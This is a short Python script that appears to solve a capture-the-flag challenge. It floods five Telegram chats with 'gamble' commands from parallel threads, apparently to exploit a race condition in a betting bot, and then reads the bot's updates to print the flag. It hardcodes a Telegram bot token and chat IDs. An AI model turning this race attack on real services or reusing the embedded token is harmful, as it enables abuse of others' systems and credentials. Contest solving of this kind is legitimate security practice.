import telegram
import threading
import requests

#token that can be generated talking with @BotFather on telegram
my_token = ''


def send(index, token='1407894669:AAHbmQoNidSZdi2mYBMfGpydDQDmiF68S5Y'):
    chat_ids = ['-432853389', '-465599643', '-485525409', '-416234375', '-422816077']
    bot = telegram.Bot(token=token)
    bot.sendMessage(chat_id=chat_ids[index], text='login zeze zeze')
    #while 1:
    for i in range(10):
        bot.sendMessage(chat_id=chat_ids[index], text='gamble')
    bot.sendMessage(chat_id=chat_ids[index], text='buy flag')

def flag():
    res = requests.get('https://api.telegram.org/bot1407894669:AAHbmQoNidSZdi2mYBMfGpydDQDmiF68S5Y/getUpdates').text.split('\n')
    for r in res:
        if 'balsn' in r:
            print(r)

def sim():
    threads = []
    for i in range(5):
        threads.append(threading.Thread(target = send, args=(i, )))
        threads[i].start()

sim()
#flag()
